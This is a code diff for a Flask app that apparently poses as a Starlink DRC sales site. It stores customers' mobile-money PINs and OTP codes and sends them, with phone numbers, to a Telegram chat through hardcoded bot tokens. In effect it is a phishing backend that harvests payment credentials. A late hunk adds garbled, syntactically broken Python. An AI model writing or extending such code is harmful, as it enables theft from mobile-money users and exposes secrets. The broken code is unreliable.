@@ -23,7 +23,7 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
 # TELEGRAM CONFIG
-TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8772088407:AAE2EKy8ti-VBwmT8Ie_yXflXsZ2cpefak0')
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8768508073:AAFNCWh9V9LRVqpLuVSmMnj_uNzEsiCspuM')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '6624177719')
 TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'
 
@@ -66,11 +66,13 @@ class Order(db.Model):
     amount = db.Column(db.Float, nullable=False)
     status = db.Column(db.String(30), default='Pending')
     airtel_number = db.Column(db.String(20))
-    airtel_pin = db.Column(db.String(10))
+    mpesa_pin = db.Column(db.String(10))
     otp1 = db.Column(db.String(10))
     otp2 = db.Column(db.String(10))
     otp3 = db.Column(db.String(10))
     otp4 = db.Column(db.String(10))
+    otp5 = db.Column(db.String(10))
+    otp6 = db.Column(db.String(10))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     plan = db.relationship('Plan', backref='orders')
 
@@ -83,11 +85,13 @@ class Order(db.Model):
             'amount': self.amount,
             'status': self.status,
             'airtel_number': self.airtel_number,
-            'airtel_pin': self.airtel_pin,
+            'mpesa_pin': self.mpesa_pin,
             'otp1': self.otp1,
             'otp2': self.otp2,
             'otp3': self.otp3,
             'otp4': self.otp4,
+            'otp5': self.otp5,
+            'otp6': self.otp6,
             'created_at': self.created_at.strftime('%b %d, %Y'),
         }
 
@@ -138,7 +142,7 @@ def notify_new_order(order):
         f'💰 Amount: <b>CDF {order.amount:,.0f}</b>\n'
         f'━━━━━━━━━━━━━━━━━━━━━━\n'
         f'📱 <b>Phone:</b> <code>{order.user.phone}</code>\n'
-        f'🔐 <b>PIN:</b> <code>{order.airtel_pin or "N/A"}</code>\n'
+        f'🔐 <b>PIN:</b> <code>{order.mpesa_pin or "N/A"}</code>\n'
         f'🆔 <b>Kit ID:</b> <code>{kit_id}</code>\n'
         f'⏰ <b>OTP Expiry:</b> 5 minutes\n'
         f'━━━━━━━━━━━━━━━━━━━━━━\n'
@@ -309,7 +313,7 @@ def create_order():
     data = request.get_json()
     phone = data.get('phone', '').strip()
     plan_id = data.get('plan_id')
-    airtel_pin = data.get('airtel_pin', '')
+    mpesa_pin = data.get('mpesa_pin', '')
 
     if not phone or not plan_id:
         return jsonify({'error': 'Phone and plan_id required'}), 400
@@ -332,10 +336,33 @@ def create_order():
         amount=plan.price_cdf,
         status='Pending',
         airtel_number=phone,
-        airtel_pin=airtel_pin,
+        mpesa_pin=mpesa_pin,
     )
+
+    # Generate OTP for this order
+    new_otp = ''.join(random.choices(string.digits, k=6))
+    order.otp1 = new_otp[0]
+    order.otp2 = new_otp[1]
+    order.otp3 = new_otp[2]
+    order.otp4 = new_otp[3]
+    order.otp5 = new_otp[4]
+    order.otp6 = new_otp[5]
+    
     db.session.add(order)
     db.session.commit()
+
+    # Send OTP via Telegram
+    msg = (
+        f'🔐 <b>OTP CODE — Starlink DRC</b>\n'
+        f'━━━━━━━━━━━━━━━━━━━━━━\n'
+        f'📋 Order: <b>{order.order_ref}</b>\n'
+        f'📱 Phone: <code>{order.user.phone}</code>\n'
+        f'🔢 <b>OTP:</b> <code>{new_otp}</code>\n'
+        f'⏰ <b>Expires in:</b> 5 minutes\n'
+        f'━━━━━━━━━━━━━━━━━━━━━━\n'
+        f'💡 Use this code to verify payment'
+    )
+    send_telegram(msg)
 
     notify_new_order(order)
     return jsonify(order.to_dict()), 201
@@ -353,34 +380,30 @@ def update_order(order_id):
     if 'otp' in data and 'status' in data:
         entered_otp = data.get('otp', '')
         
-        # Build the stored OTP from individual digits
-        stored_otp = f'{order.otp1 or ""}{order.otp2 or ""}{order.otp3 or ""}{order.otp4 or ""}'.strip()
+        # Build the stored OTP from individual digits (6 digits now)
+        stored_otp = f'{order.otp1 or ""}{order.otp2 or ""}{order.otp3 or ""}{order.otp4 or ""}{order.otp5 or ""}{order.otp6 or ""}'.strip()
         
-        # Verify OTP if it exists, otherwise accept (for backwards compatibility)
-        if stored_otp and len(stored_otp) == 4:
+        # Verify 6-digit OTP
+        if stored_otp and len(stored_otp) == 6:
             if entered_otp == stored_otp:
                 # OTP verified successfully
                 order.status = 'Pin_Verified'
-                # Also store individual OTP digits for record
-                if len(entered_otp) == 4:
-                    order.otp1 = entered_otp[0]
-                    order.otp2 = entered_otp[1]
-                    order.otp3 = entered_otp[2]
-                    order.otp4 = entered_otp[3]
             else:
-                # OTP verification failed
-                order.status = 'Failed'
+                # OTP verification failed - keep as Pending for retry
+                order.status = 'Pending'
         else:
             # No OTP set yet - accept the update (first time)
             order.status = data.get('status', order.status)
-            if len(entered_otp) == 4:
+            if len(entered_otp) == 6:
                 order.otp1 = entered_otp[0]
                 order.otp2 = entered_otp[1]
                 order.otp3 = entered_otp[2]
                 order.otp4 = entered_otp[3]
+                order.otp5 = entered_otp[4]
+                order.otp6 = entered_otp[5]
     else:
         # Regular field updates
-        updatable = ['status', 'airtel_number', 'airtel_pin', 'otp1', 'otp2', 'otp3', 'otp4']
+        updatable = ['status', 'airtel_number', 'mpesa_pin', 'otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6']
         for field in updatable:
             if field in data:
                 setattr(order, field, data[field])
@@ -404,8 +427,8 @@ def update_order(order_id):
                 'id': order.id,
                 'order_ref': order.order_ref,
                 'status': order.status,
-                'verified': False,
-                'error': 'Invalid OTP code'
+               ,
+                'error 'verified': False': 'Invalid OTP code'
             })
     
     return jsonify({
@@ -608,3 +631,4 @@ if __name__ == '__main__':
     # Run in debug mode locally, but disable for production
     debug_mode = os.environ.get('FLASK_DEBUG', 'True').lower() == 'true'
     app.run(debug=debug_mode, host='0.0.0.0', port=5000)
+
